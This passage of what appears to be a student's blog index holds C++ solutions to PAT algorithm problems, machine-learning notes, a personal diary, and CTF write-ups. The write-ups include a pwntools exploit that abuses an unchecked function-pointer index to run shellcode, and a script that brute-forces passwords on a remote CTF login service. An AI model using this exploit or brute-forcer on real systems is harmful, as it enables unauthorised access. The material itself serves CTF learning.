0;&#125;","tags":[{"name":"PAT","slug":"PAT","permalink":"http://reehy.top/tags/PAT/"}]},{"title":"PAT advanced 1014","date":"2017-02-14T09:27:34.000Z","path":"2017/02/14/PAT-advanced-1014/","text":"Description 1014.Waiting in Line (30) Suppose a bank has N windows open for service. There is a yellow line in front of the windows which devides the waiting area into two parts. The rules for the customers to wait in line are: The space inside the yellow line in front of each window is enough to contain a line with M customers. Hence when all the N lines are full, all the customers after (and including) the (NM+1)st one will have to wait in a line behind the yellow line.Each customer will choose the shortest line to wait in when crossing the yellow line. If there are two or more lines with the same length, the customer will always choose the window with the smallest number.Customer[i] will take T[i] minutes to have his/her transaction processed.The first N customers are assumed to be served at 8:00am.Now given the processing time of each customer, you are supposed to tell the exact time at which a customer has his/her business done. For example, suppose that a bank has 2 windows and each window may have 2 custmers waiting inside the yellow line. There are 5 customers waiting with transactions taking 1, 2, 6, 4 and 3 minutes, respectively. At 08:00 in the morning, customer1 is served at window1 while customer2 is served at window2. Customer3 will wait in front of window1 and customer4 will wait in front of window2. Customer5 will wait behind the yellow line. At 08:01, customer1 is done and customer5 enters the line in front of window1 since that line seems shorter now. Customer2 will leave at 08:02, customer4 at 08:06, customer3 at 08:07, and finally customer5 at 08:10. Input Each input file contains one test case. Each case starts with a line containing 4 positive integers: N (&lt;=20, number of windows), M (&lt;=10, the maximum capacity of each line inside the yellow line), K (&lt;=1000, number of customers), and Q (&lt;=1000, number of customer queries). The next line contains K positive integers, which are the processing time of the K customers. The last line contains Q positive integers, which represent the customers who are asking about the time they can have their transactions done. The customers are numbered from 1 to K. Output For each of the Q customers, print in one line the time at which his/her transaction is finished, in the format HH:MM where HH is in [08, 17] and MM is in [00, 59]. Note that since the bank is closed everyday after 17:00, for those customers who cannot be served before 17:00, you must output “Sorry” instead. Sample Input2 2 7 51 2 6 4 3 534 23 4 5 6 7 Sample Output08:0708:0608:1017:00Sorry 我自己写的代码vs上编译没问题，g++编译不过，至今明白为什么，自己测试应该是对的。贴了参考别人的。 Code12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849#include&lt;cstdio&gt; #include&lt;string&gt; #include&lt;cstring&gt; #include&lt;vector&gt; #include&lt;iostream&gt; #include&lt;queue&gt; #include&lt;algorithm&gt; using namespace std;typedef long long LL;const int INF = 0x7FFFFFFF;const int maxn = 1e3 + 10;int T, a, b, n, q, x, t[maxn];queue&lt;int&gt; p[maxn];struct point&#123; int x, y; point(int x = 0, int y = 0) :x(x), y(y)&#123;&#125;&#125;f[maxn];int main()&#123; scanf(\"%d%d%d%d\", &amp;a, &amp;b, &amp;n, &amp;q); for (int i = 1; i &lt;= n; i++) &#123; scanf(\"%d\", &amp;x); int min = 1; for (int j = 1; j &lt;= a; j++) &#123; if (i &lt;= a*b) &#123; if (p[j].size() &lt; p[min].size()) min = j; &#125; else if (p[j].front() &lt; p[min].front()) min = j; &#125; t[min] += x; p[min].push(t[min]); if (i &gt; a*b) p[min].pop(); if (t[min] - x &lt; 540)f[i] = point(8 + t[min] / 60, t[min] % 60); else f[i] = point(18, 0); &#125; while (q--) &#123; scanf(\"%d\", &amp;x); (f[x].x &lt; 18) ? printf(\"%02d:%02d\\n\", f[x].x, f[x].y) : printf(\"Sorry\\n\"); &#125; return 0;&#125;","tags":[{"name":"PAT","slug":"PAT","permalink":"http://reehy.top/tags/PAT/"}]},{"title":"PAT advanced 1012","date":"2017-02-13T10:53:14.000Z","path":"2017/02/13/PAT-advanced-1012/","text":"Description 1012.The Best Rank (25) To evaluate the performance of our first year CS majored students, we consider their grades of three courses only: C - C Programming Language, M - Mathematics (Calculus or Linear Algebra), and E - English. At the mean time, we encourage students by emphasizing on their best ranks – that is, among the four ranks with respect to the three courses and the average grade, we print the best rank for each student. For example, The grades of C, M, E and A - Average of 4 students are given as the following: StudentID C M E A310101 98 85 88 90310102 70 95 88 84310103 82 87 94 88310104 91 91 91 91Then the best ranks for all the students are No.1 since the 1st one has done the best in C Programming Language, while the 2nd one in Mathematics, the 3rd one in English, and the last one in average. Input Each input file contains one test case. Each case starts with a line containing 2 numbers N and M (&lt;=2000), which are the total number of students, and the number of students who would check their ranks, respectively. Then N lines follow, each contains a student ID which is a string of 6 digits, followed by the three integer grades (in the range of [0, 100]) of that student in the order of C, M and E. Then there are M lines, each containing a student ID. Output For each of the M students, print in one line the best rank for him/her, and the symbol of the corresponding rank, separated by a space. The priorities of the ranking methods are ordered as A &gt; C &gt; M &gt; E. Hence if there are two or more ways for a student to obtain the same best rank, output the one with the highest priority. If a student is not on the grading list, simply output “N/A”. Sample Input5 6310101 98 85 88310102 70 95 88310103 82 87 94310104 91 91 91310105 85 90 90310101310102310103310104310105999999 Sample Output1 C1 M1 E1 A3 AN/A 注意排名相同情况下，取相同的最高名次。 分数要int(sum / 3 + 0.5)，但其实不四舍五入也能过。。 Code123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687#include &lt;cstdio&gt;#include &lt;cmath&gt;#include &lt;queue&gt;#include &lt;vector&gt;#include &lt;cstring&gt;#include &lt;string&gt;#include &lt;iostream&gt;#include &lt;algorithm&gt;#include &lt;climits&gt;using namespace std;typedef unsigned long long uLL;const int maxN = 2e3 + 10;struct S&#123; string name; int a[4]; int b[4]; int r[4]; int g;&#125;stu[maxN];int n, m;char sym[] = \"ACME\";int tmp[maxN];int main()&#123; cin &gt;&gt; n &gt;&gt; m; for (int i = 0; i &lt; n; i++) &#123; cin &gt;&gt; stu[i].name; float tmp = 0; for (int j = 1; j &lt; 4; j++) &#123; cin &gt;&gt; stu[i].a[j]; tmp += stu[i].a[j]; stu[i].b[j] = stu[i].a[j]; &#125; stu[i].a[0] = tmp / 3.0; stu[i].b[0] = tmp / 3.0; &#125; for (int i = 0; i &lt; 4; i++) &#123; for (int j = 0; j &lt; n; j++) tmp[j] = j; for (int p = 0; p &lt; n - 1; p++) for (int q = p + 1; q &lt; n; q++) if (stu[q].a[i] &gt; stu[p].a[i]) &#123; swap(stu[q].a[i], stu[p].a[i]); swap(tmp[p], tmp[q]); &#125; for (int j = 0; j &lt; n; j++) stu[tmp[j]].r[i] = j; for (int j = 0; j &lt; n - 1; j++) &#123; if (stu[tmp[j]].b[i] == stu[tmp[j + 1]].b[i]) stu[tmp[j + 1]].r[i] = stu[tmp[j]].r[i]; &#125; &#125; for (int i = 0; i &lt; n; i++) &#123; int tmp = maxN; for (int j = 0; j &lt; 4; j++) if (stu[i].r[j] &lt; tmp) &#123; tmp = stu[i].r[j]; stu[i].g = j; &#125; &#125; // for (int i = 0; i &lt; m; i++) &#123; string in; cin &gt;&gt; in; int j = 0; for (j = 0; j &lt; n; j++) if (stu[j].name == in) &#123; cout &lt;&lt; stu[j].r[stu[j].g] + 1 &lt;&lt; ' ' &lt;&lt; sym[stu[j].g] &lt;&lt; endl; break; &#125; if (j == n) cout &lt;&lt; \"N/A\" &lt;&lt; endl; &#125; return 0;&#125;","tags":[{"name":"PAT","slug":"PAT","permalink":"http://reehy.top/tags/PAT/"}]},{"title":"PAT advanced 1010","date":"2017-02-13T04:32:46.000Z","path":"2017/02/13/PAT-advanced-1010/","text":"Description 1010.Radix (25) Given a pair of positive integers, for example, 6 and 110, can this equation 6 = 110 be true? The answer is “yes”, if 6 is a decimal number and 110 is a binary number. Now for any pair of positive integers N1 and N2, your task is to find the radix of one number while that of the other is given. Input Specification: Each input file contains one test case. Each case occupies a line which contains 4 positive integers:N1 N2 tag radixHere N1 and N2 each has no more than 10 digits. A digit is less than its radix and is chosen from the set {0-9, a-z} where 0-9 represent the decimal numbers 0-9, and a-z represent the decimal numbers 10-35. The last number “radix” is the radix of N1 if “tag” is 1, or of N2 if “tag” is 2. Output Specification: For each test case, print in one line the radix of the other number so that the equation N1 = N2 is true. If the equation is impossible, print “Impossible”. If the solution is not unique, output the smallest possible radix. Sample Input 1:6 110 1 10Sample Output 1:2 Sample Input 2:1 ab 1 2Sample Output 2:Impossible 自己写的超时了，后来改了下又没全过，找不到问题郁闷极了。。借鉴了别人的 Code12345678910111213141516171819202122232425262728293031323334353637383940#include &lt;cstdio&gt;#include &lt;cmath&gt;#include &lt;queue&gt;#include &lt;vector&gt;#include &lt;cstring&gt;#include &lt;string&gt;#include &lt;iostream&gt;#include &lt;algorithm&gt;#include &lt;climits&gt;using namespace std;typedef unsigned long long uLL;const int maxn = 1e5 + 10;string a, b;int tag, radix, res;uLL ans = 0, l, r;uLL get(char ch)&#123; if ('0' &lt;= ch&amp;&amp;ch &lt;= '9') return ch - '0'; return ch - 'a' + 10;&#125;int main()&#123; cin &gt;&gt; a &gt;&gt; b &gt;&gt; tag &gt;&gt; radix; if (tag == 2) swap(a, b); for (int i = 0; a[i]; i++) ans = ans*radix + get(a[i]); for (int i = 0; b[i]; i++) l = max(l, get(b[i])); for (l++, r = ans + 1; l &lt;= r;) &#123; uLL mid = l + r &gt;&gt; 1; uLL check = 0; for (int i = 0; b[i]; i++) check = check*mid + get(b[i]); if (check == ans) res = mid; if (check &gt;= ans) r = mid - 1; else l = mid + 1; &#125; res ? printf(\"%d\\n\", res) : printf(\"Impossible\\n\"); return 0;&#125;","tags":[{"name":"PAT","slug":"PAT","permalink":"http://reehy.top/tags/PAT/"}]},{"title":"PAT advanced 1009","date":"2017-02-09T14:20:20.000Z","path":"2017/02/09/PAT-advanced-1009/","text":"Description 1009.Product of Polynomials (25) Input Specification: Each input file contains one test case. Each case occupies 2 lines, and each line contains the information of a polynomial: K N1 aN1 N2 aN2 … NK aNK, where K is the number of nonzero terms in the polynomial, Ni and aNi (i=1, 2, …, K) are the exponents and coefficients, respectively. It is given that 1 &lt;= K &lt;= 10, 0 &lt;= NK &lt; … &lt; N2 &lt; N1 &lt;=1000. Output Specification: For each test case you should output the product of A and B in one line, with the same format as the input. Notice that there must be NO extra space at the end of each line. Please be accurate up to 1 decimal place. Sample Input2 1 2.4 0 3.22 2 1.5 1 0.5 Sample Output3 3 3.6 2 6.0 1 1.6 居然一次过了。 Code1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950#include &lt;cstdio&gt;#include &lt;queue&gt;#include &lt;vector&gt;#include &lt;cstring&gt;#include &lt;string&gt;#include &lt;iostream&gt;#include &lt;algorithm&gt;#include &lt;climits&gt;using namespace std;typedef long long LL;const int maxN = 1e3 + 10;float ans[maxN + maxN];float p1[maxN];float p2[maxN];int k1, k2, k3;int main()&#123; cin &gt;&gt; k1; while (k1--) &#123; int x; cin &gt;&gt; x; cin &gt;&gt; p1[x]; &#125; cin &gt;&gt; k2; while (k2--) &#123; int x; cin &gt;&gt; x; cin &gt;&gt; p2[x]; &#125; for (int i = 0; i &lt; maxN; i++) &#123; if (p2[i]) for (int j = 0; j &lt; maxN; j++) &#123; if (p1[j]) ans[i + j] += p1[j] * p2[i]; &#125; &#125; for (int i = 0; i &lt; 2 * maxN; i++) if (ans[i]) k3++; cout &lt;&lt; k3; for (int i = 2 * maxN - 1; i &gt;= 0; i--) &#123; if (ans[i]) printf(\" %d %.1f\", i, ans[i]); &#125; return 0;&#125;","tags":[{"name":"PAT","slug":"PAT","permalink":"http://reehy.top/tags/PAT/"}]},{"title":"Coursera Machine Learning 笔记","date":"2017-02-09T12:52:18.000Z","path":"2017/02/09/Coursera-Machine-Learning-笔记/","text":"Week 1 What is machine learing? A computer program is said to learn from experience E with respect to some class of tasks T and performance measure P, if its performance at tasks in T, as measured by P, improves with experience E. 简单理解：通过P方法完成任务T，并在经验E中学习。 achine learning 简单分为两类 Supervised learning (监督学习) 通过一定的有正确答案的数据（训练集），基于此进行预测。 Regression problem (回归问题) Classification problem (分类问题) Unsupervised learning (非监督学习) 通过某种算法，基于没有正确结果之间的关系的数据进行聚合(clustering)分类。 Clustering: automatically gene group Non-Clustering: Cocktail Party Algorithm(鸡尾酒晚会效应)","tags":[{"name":"ML","slug":"ML","permalink":"http://reehy.top/tags/ML/"}]},{"title":"PAT advanced 1007","date":"2017-02-09T11:01:40.000Z","path":"2017/02/09/PAT-advanced-1007/","text":"Description 1007.Maximum Subsequence Sum (25) Given a sequence of K integers { N1, N2, …, NK }. A continuous subsequence is defined to be { Ni, Ni+1, …, Nj } where 1 &lt;= i &lt;= j &lt;= K. The Maximum Subsequence is the continuous subsequence which has the largest sum of its elements. For example, given sequence { -2, 11, -4, 13, -5, -2 }, its maximum subsequence is { 11, -4, 13 } with the largest sum being 20. Now you are supposed to find the largest sum, together with the first and the last numbers of the maximum subsequence. Input Specification: Each input file contains one test case. Each case occupies two lines. The first line contains a positive integer K (&lt;= 10000). The second line contains K numbers, separated by a space. Output Specification: For each test case, output in one line the largest sum, together with the first and the last numbers of the maximum subsequence. The numbers must be separated by one space, but there must be no extra space at the end of a line. In case that the maximum subsequence is not unique, output the one with the smallest indices i and j (as shown by the sample case). If all the K numbers are negative, then its maximum sum is defined to be 0, and you are supposed to output the first and the last numbers of the whole sequence. Sample Input:10-10 1 2 3 4 -5 -23 3 7 -21 Sample Output:10 1 4 第一次超时了O(n^3)，后来改成O(n^2)了。 Code1234567891011121314151617181920212223242526272829303132333435363738394041424344454647#include &lt;cstdio&gt;#include &lt;queue&gt;#include &lt;vector&gt;#include &lt;cstring&gt;#include &lt;string&gt;#include &lt;iostream&gt;#include &lt;algorithm&gt;#include &lt;climits&gt;using namespace std;const int maxN = 1e4 + 10;int q[maxN];int n;int tmp;int flag = 0;int ans = numeric_limits&lt;int&gt;::min();int f, l;int main()&#123; cin &gt;&gt; n; for (int i = 0; i &lt; n; i++) cin &gt;&gt; q[i]; for (flag = 0; flag &lt; n &amp;&amp; q[flag] &lt; 0; flag++); if (flag == n ) &#123; cout &lt;&lt; 0 &lt;&lt; ' ' &lt;&lt; q[0] &lt;&lt; ' ' &lt;&lt; q[n - 1]; return 0; &#125; for (int i = 0; i &lt; n; i++) &#123; int sum = 0; for (int j = i; j &lt; n; j++) &#123; if ((sum += q[j]) &gt; ans) &#123; ans = sum; f = q[i]; l = q[j]; &#125; &#125; &#125; cout &lt;&lt; ans &lt;&lt; ' ' &lt;&lt; f &lt;&lt; ' ' &lt;&lt; l; return 0;&#125;","tags":[{"name":"PAT","slug":"PAT","permalink":"http://reehy.top/tags/PAT/"}]},{"title":"大二学习与生活计划","date":"2017-02-08T17:44:08.000Z","path":"2017/02/09/大二学习与生活计划/","text":"大二时，你在做什么 这是我的回答呢一年后，我再回来看时，希望可以让自己满意。 学好英语，600+分数过六级。 十万行代码。 独立从前端到后端开发一个平台。 在逆向与pwn上达到牛师傅的水平(不过可能直到毕业也达不到的)。 暑假能去向往的安全公司实习。 将团队带到一个新高度。培养几个能发展的新苗子。 社团进入正轨。 如果以上完成了大部分，那么最后一条估计是完不成了。。找到喜欢的妹子。。 以下算是具体的实施计划吧： 每天200行代码，上传到github, 创建自己的代码仓库， 有自己的项目。 每天一道pwn或者re， 自己调试出来， 掌握的知识点务必写道博客里。 每天背单词， 看英语新闻一篇。 睡前关注安全新动态，好的文章转载， 以后转载到team的博客上。 尽快在土司上建立账号。 按时洗衣服， 尽早睡觉， 不要无故熬夜。 每周打一个电话回家。 用番茄土豆记录有效学习时间， 提高效率， 每周打印有效学习时间。 EeveryDay Life2016.9.21结束了两天的上海自由行，ISG拿了一个三等奖，虽然含金量不高，但是依旧是值得为之兴奋的。这只是一个开始，永远不要放弃。学校太令人失望了，但还好我们的团队内部活力满满。虽然队友还是太菜了，大多数人也不是那么努力，但自己也没有达到一定的高度呀。以后在Bin方向做出成绩后多向牛博士请教，参加高级的比赛。 最近的代码看的不是很多，python以后就是我的开发主要语言了吧。找到了一些短小的开源项目，准备阅读。看了看CSDN上的外包项目，除了一些我跳一跳还是能够得着的之外，大都数都还是不能做的，coding能力还是大大要提高的。想换键盘。 24号之前把合天的资料转成Markdown，实验做一下，顺便练一下爬虫。再整理一下常见C的汇编转换，整理一下，留给学弟看。 2016.9.23天天都要军训，真的好累。真的感觉意志力快消磨光了。找夏想想聊聊天，但婉拒了，言语中带着以前的温柔，还是谢谢你能这么耐心了。现在的我是不是太功利了。 爸妈，我不知道怎么说了。很复杂。不想说。 我真怕我会坚持不了。 承担不起你的野心，也辜负了所受的苦难。 尴尬啊，最近得写色情图片爬虫了，其实我还是很想写的，就是不太想展示出来。 写个色情图片爬虫为什么不能写个色情网站的大全呢，如果是写一个这种东西回不回更有价值？ 说说最近吧，python练习册做的还是不错的，我觉得是时候可以自己开始写东西了。发现了学语言的最好的方法，先学个大概的语法，然后就上手开始写程序，最后看看语法书，总结一下，学的又快又好。 可是关于pwn和逆向的都还没怎么看，今天一定要把一个逆向给做完，就那个混淆迷宫吧。 200行代码的量还是没有做到，今天应该可以做到的，毕竟要写一个大程序呢。","tags":[{"name":"life","slug":"life","permalink":"http://reehy.top/tags/life/"}]},{"title":"PAT advanced 1006","date":"2017-02-08T16:10:16.000Z","path":"2017/02/09/PAT-advanced-1006/","text":"Description 1006.Sign In and Sign Out (25) Input Specification: Each input file contains one test case. Each case contains the records for one day. The case starts with a positive integer M, which is the total number of records, followed by M lines, each in the format: ID_number Sign_in_time Sign_out_timewhere times are given in the format HH:MM:SS, and ID number is a string with no more than 15 characters. Output Specification: For each test case, output in one line the ID numbers of the persons who have unlocked and locked the door on that day. The two ID numbers must be separated by one space. Note: It is guaranteed that the records are consistent. That is, the sign in time must be earlier than the sign out time for each person, and there are no two persons sign in or out at the same moment. Sample Input:3CS301111 15:30:28 17:00:10SC3021234 08:00:00 11:25:25CS301133 21:45:00 21:58:40 Sample Output:SC3021234 CS301133 被自己蠢到了。开锁和上锁的输出顺序弄错了，瞎忙活了一个小时。 cin遇到Space,Tab,Enter会结束读取。 ||优先级比?，长逻辑不确定记得加() Code1234567891011121314151617181920212223242526272829303132333435363738394041#include &lt;cstdio&gt;#include &lt;queue&gt;#include &lt;vector&gt;#include &lt;cstring&gt;#include &lt;string&gt;#include &lt;iostream&gt;#include &lt;algorithm&gt;#include &lt;climits&gt;using namespace std;int m;string first;string last;string id;struct id&#123; int h, m, s;&#125;maxi, mini, tmp;int main()&#123; scanf(\"%d\", &amp;m); for (int i = 0; i &lt; m;i++) &#123; cin &gt;&gt; id; scanf(\"%d:%d:%d\", &amp;tmp.h, &amp;tmp.m, &amp;tmp.s); if (!i || (tmp.h == mini.h ? tmp.m == mini.m ? tmp.s &lt; mini.s : tmp.m &lt; mini.m : tmp.h &lt; mini.h)) &#123; mini = tmp; first = id; &#125; scanf(\"%d:%d:%d\", &amp;tmp.h, &amp;tmp.m, &amp;tmp.s); if (!i || (tmp.h == maxi.h ? tmp.m == maxi.m ? tmp.s &gt; maxi.s : tmp.m &gt; maxi.m : tmp.h &gt; maxi.h)) &#123; maxi = tmp; last = id; &#125; &#125; cout &lt;&lt; first &lt;&lt; \" \" &lt;&lt; last &lt;&lt; endl; return 0;&#125;","tags":[{"name":"PAT","slug":"PAT","permalink":"http://reehy.top/tags/PAT/"}]},{"title":"PAT advanced 1004","date":"2017-02-08T08:02:14.000Z","path":"2017/02/08/PAT-advanced-1004/","text":"Description 1004.Counting Leaves(30) A family hierarchy is usually presented by a pedigree tree. Your job is to count those family members who have no child.Input Each input file contains one test case. Each case starts with a line containing 0 &lt; N &lt; 100, the number of nodes in a tree, and M (&lt; N), the number of non-leaf nodes. Then M lines follow, each in the format: ID K ID[1] ID[2] … ID[K]where ID is a two-digit number representing a given non-leaf node, K is the number of its children, followed by a sequence of two-digit ID’s of its children. For the sake of simplicity, let us fix the root ID to be 01.Output For each test case, you are supposed to count those family members who have no child for every seniority level starting from the root. The numbers must be printed in a line, separated by a space, and there must be no extra space at the end of each line. The sample case represents a tree with only 2 nodes, where 01 is the root and 02 is its only child. Hence on the root 01 level, there is 0 leaf node; and on the next level, there is 1 leaf node. Then we should output “0 1” in a line. Sample Input2 101 1 02Sample Output0 1 参考了排行榜里的一位前辈，学习了很多的东西，比如vector真的是一个很方便的东西；又比如std::max(int a ,int b)这个很方便的函数。很多在学数据结构的时候没有好好学习，数据结构还是要补一补。 不过这种不系统的学习方法真的好么？ 还是要抽时间好好学一遍的。 Code1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950#include &lt;cstdio&gt;#include &lt;queue&gt;#include &lt;vector&gt;#include &lt;cstring&gt;#include &lt;string&gt;#include &lt;iostream&gt;#include &lt;algorithm&gt;#include &lt;climits&gt;typedef long long LL;using namespace std;const int maxN = 1e2 + 10;int n;int m;int ans[maxN];int deep = 0;vector&lt;int&gt; tree[maxN];void dfs(int i, int d)&#123; deep = max(deep, d); if (!tree[i].size()) ans[d]++; for (int j = 0; j &lt; tree[i].size(); j++) &#123; dfs(tree[i][j], d + 1); &#125;&#125;int main()&#123; scanf(\"%d%d\", &amp;n, &amp;m); while (m--) &#123; int id, d; scanf(\"%d%d\", &amp;id, &amp;d); while (d--) &#123; int y; scanf(\"%d\", &amp;y); tree[id].push_back(y); &#125; &#125; dfs(1, 0); for (int i = 0; i &lt;= deep; i++) printf(\"%s%d\", i ? \" \" : \"\", ans[i]); system(\"pause\"); return 0;&#125;","tags":[{"name":"PAT","slug":"PAT","permalink":"http://reehy.top/tags/PAT/"}]},{"title":"腾讯一道pwn题","date":"2017-02-07T21:09:51.000Z","path":"2017/02/08/腾讯一道pwn题/","text":"漏洞发现123456789101112131415161718192021int __cdecl main(int argc, const char **argv, const char **envp)&#123; int v4; // [sp+1Ch] [bp-14h]@1 int v5; // [sp+20h] [bp-10h]@1 int v6; // [sp+24h] [bp-Ch]@1 func v7; // [sp+28h] [bp-8h]@1 int v8; // [sp+2Ch] [bp-4h]@1 puts(\"Which method would you like to choose?\\n1. Add\\n2. Subtract\\n3. Multiply\\n4. Divide\"); fflush(stdout); readIntegers(&amp;v6, &amp;v5); printf(\"You chose: %d\\n\", v6); puts(\"Enter two numbers to do math with, e.g. [123 110]\"); fflush(stdout); readIntegers(&amp;v5, &amp;v4); v7 = funcs[v6 - 1]; v8 = v7(v5, v4); printf(\"Result is : %d\\n\", v8); fflush(stdout); return 0;&#125; 选择加减乘除选项，通过一个函数指针数组实现（？不知道函数指针数组是不是就是这么实现的），没有检查偏移，可以控制偏移到我们的shellcode上。shellcode写在全局数组buf里。buf前四个字节写上buf+4的地址，buf+4写shellcode。 程序的保护： 123pwndbg&gt; checksec RELRO STACK CANARY NX PIE RPATH RUNPATH FILEPartial RELRO No canary found NX disabled No PIE No RPATH No RUNPATH /home/ubuntu/workspace/nbw/tc 都没开，不过好像也没用到。 里面的函数指针数组的实现（暂且这么称呼吧）还是蛮有意思的，贴一下： 12345678910mov eax, [esp+24h]sub eax, 1 // 刚开始忘了这里减1，坑了很久mov eax, funcs[eax*4] //取func+eax*4的值，将这个值写为buf的地址的偏移 28+1mov [esp+28h], eaxmov edx, [esp+1Ch]mov eax, [esp+20h]mov [esp+4], edxmov [esp], eaxmov eax, [esp+28h]call eax exp12345678910111213141516171819202122from pwn import *context.log_level = 'debug'# fun[v6 - 1]func_addr = 0x804A030buf_addr = 0x804A0A0shellcode = shellcraft.i386.sh()shellcode = asm(shellcode)offset = (buf_addr - func_addr) / 4 + 1payload1 = str(offset)payload2 = p32(buf_addr + 4)payload2 += shellcodep = process('./tc')p.recvuntil('Divide\\n')p.sendline(payload1)p.recvuntil('110]\\n')p.sendline(payload2)p.interactive()","tags":[{"name":"PWN","slug":"PWN","permalink":"http://reehy.top/tags/PWN/"},{"name":"writeup","slug":"writeup","permalink":"http://reehy.top/tags/writeup/"}]},{"title":"AlexCTF writeup","date":"2017-02-06T17:29:01.000Z","path":"2017/02/07/AlexCTF-writeup/","text":"先膜下我们逆向的队友，是真的强，不知道哪位，改天去问问。我就好好学习pwn吧。再吐槽下这个比赛，脑洞奇大= = TriviaTR1: Hello there认识了一个叫做IRC(Internet Relay Chat)的在线聊天室，使用方法简单，起一个Nickname，在同一个Chanel里即可。顶部就是Flag #alexctf: Alexandria University student held capture the flag event ctf.oddcoder.com ALEXCTF{W3_w15h_y0u_g00d_luck} Forensicsfore1: hit the corestrings看一下，发现了一串字符串 1cvqAeqacLtqazEigwiXobxrCrtuiTzahfFreqc&#123;bnjrKwgk83kgd43j85ePgb_e_rwqr7fvbmHjklo3tews_hmkogooyf0vbnk0ii87Drfgh_n kiwutfb0ghk9ro987k5tfb_hjiouo087ptfcv&#125; 然后大家脑洞清奇的发现了所有的大写字母拼起来就是flag 123456strings ='''AeqacLtqazEigwiXobxrCrtuiTzahfFreqc&#123;bnjrKwgk83kgd43j85ePgb_e_rwqr7fvbmHjklo3tews_hmkogooyf0vbnk0ii87Drfgh_n kiwutfb0ghk9ro987k5tfb_hjiouo087ptfcv&#125;'''flag = ''for i in range(len(strings)): if i % 5 == 0: flag += strings[i]print flag flagALEXCTF{K33P_7H3_g00D_w0rk_up} fore2: mail client看了某个答案，是爆破的，当时没想到，但不觉得是一个好方法最终结果是ALEXCTF{Mu77_Th3_CoRe}代码： 12345678910111213141516171819from pwn import *f = open('string', 'r')lines = f.readlines()for i in lines: p = remote('195.154.53.62', 2222) p.recvuntil('Email:') p.sendline('alexctf@example.com') p.recvuntil('Password:') print i p.sendline(i) flag = p.recvline() if 'Invalid' in flag: p.close() continue else: print flag p.interactive() Password: dksgkpdjg;kdj;gkje;gj;dkgv a enpginewognvln owkge noejne就是strings了core下 fore3: usb probingusb传了一个png，在最大的数据包里能看到，windows有毒，用浏览器打开png才能正常看到 ALEXCTF{SN1FF_T3H_FL4G_OV3R_USB} fore4: unknown format里面有一个.SP01文件，上网查一下，是kindle的升级包。网上还有一个kindletool的工具，可以从这种包中打包和提取文件。 Kindletool 使用过程如下： 12345678910111213141516171819202122232425262728293031323334353637ubuntu@VM-250-199-ubuntu:~/ctf-problem/2017alexctf/forensics/unknown_format$ ./kindletool dm out flagubuntu@VM-250-199-ubuntu:~/ctf-problem/2017alexctf/forensics/unknown_format$ file flagflag: dataubuntu@VM-250-199-ubuntu:~/ctf-problem/2017alexctf/forensics/unknown_format$ binwalk flag DECIMAL HEXADECIMAL DESCRIPTION--------------------------------------------------------------------------------254 0xFE gzip compressed data, from Unix, last modified: 2016-12-31 20:20:49ubuntu@VM-250-199-ubuntu:~/ctf-problem/2017alexctf/forensics/unknown_format$ binwalk -e flag DECIMAL HEXADECIMAL DESCRIPTION--------------------------------------------------------------------------------254 0xFE gzip compressed data, from Unix, last modified: 2016-12-31 20:20:49ubuntu@VM-250-199-ubuntu:~/ctf-problem/2017alexctf/forensics/unknown_format$ lsflag _flag.extracted kindletool out usb_sniff.pcapubuntu@VM-250-199-ubuntu:~/ctf-problem/2017alexctf/forensics/unknown_format$ cd _flag.extracted/ &amp;&amp; lsFE FE.gzubuntu@VM-250-199-ubuntu:~/ctf-problem/2017alexctf/forensics/unknown_format/_flag.extracted$ tar -zxvf FE.gzkindle_out/kindle_out/rootfs_md5_list.tar.gzkindle_out/2540270001-2692310002.ffskindle_out/flag.txtkindle_out/update-patches.tar.gzgzip: stdin: unexpected end of filetar: Unexpected EOF in archivetar: Unexpected EOF in archivetar: Error is not recoverable: exiting nowubuntu@VM-250-199-ubuntu:~/ctf-problem/2017alexctf/forensics/unknown_format/_flag.extracted$ lsFE FE.gz kindle_outubuntu@VM-250-199-ubuntu:~/ctf-problem/2017alexctf/forensics/unknown_format/_flag.extracted$ cd kindle_out/ubuntu@VM-250-199-ubuntu:~/ctf-problem/2017alexctf/forensics/unknown_format/_flag.extracted/kindle_out$ ls2540270001-2692310002.ffs flag.txt rootfs_md5_list.tar.gz update-patches.tar.gzubuntu@VM-250-199-ubuntu:~/ctf-problem/2017alexctf/forensics/unknown_format/_flag.extracted/kindle_out$ cat flag.txt ALEXCTF&#123;Wh0_N33d5_K1nDl3_t0_3X7R4Ct_K1ND13_F1rMw4R3&#125; ScriptingScript2找到原图。。比较一下，排除噪音，有不同的地方。 原图： 下面引用别人的答案： Some of that is noise. The pixels that look interesting are the 3 rows, where pixels seem to differ at somewhat regular intervals: If we print out the x values of these pixels, we get: 4 17 36 60 68 85 101 120 132 147 165 180 196 214 231 251 260 275 292 305 325 340 357 371 389 415 420 440 452 473 484 500 4 21 37 63 69 83 100 117 132 147 165 178 196 213 229 244 261 275 293 319 324 340 356 383 388 414 421 436 453 479 485 500 4 24 36 53 69 89 103 125 Or in hex: 04 11 24 3c 44 55 65 78 84 93 a5 b4 c4 d6 e7 fb 104 113 124 131 145 154 165 173 185 19f 1a4 1b8 1c4 1d9 1e4 1f4 04 15 25 3f 45 53 64 75 84 93 a5 b2 c4 d5 e5 f4 105 113 125 13f 144 154 164 17f 184 19e 1a5 1b4 1c5 1df 1e5 1f4 04 18 24 35 45 59 67 7d Note that the leading hex character always increments by 1. However, what happens when we look at just the lower 4 bits of each position in hex? 414c45584354467b434154535f484944455f534543524554535f444f4e545f544845597d That looks like ASCII! It decodes to ALEXCTF{CATS_HIDE_SECRETS_DONT_THEY}. flag.py 12345678910111213141516import binasciifrom PIL import Imagenew = Image.open('cat_with_secrets.png').load()old = Image.open('cat_with_secrets_original.jpg').load()width = 512in_hex = ''for y in range(3): for x in range(width): if (y, x) &lt;= (2, 125) and new[x, y] != old[x, y]: in_hex += '%x' % (x % 16)print(binascii.unhexlify(in_hex)) 当然了简单的方法，pip install steganography，然后runsteganography -d cat-with-secrets.png","tags":[{"name":"writeup","slug":"writeup","permalink":"http://reehy.top/tags/writeup/"}]},{"title":"PAT advanced 1002","date":"2017-02-02T16:30:58.000Z","path":"2017/02/03/PAT-advanced-1002/","text":"Description 1002.A+B for Polynomials (25) Input Each input file contains one test case. Each case occupies 2 lines, and each line contains the information of a polynomial: K N1 aN1 N2 aN2 … NK aNK, where K is the number of nonzero terms in the polynomial, Ni and aNi (i=1, 2, …, K) are the exponents and coefficients, respectively. It is given 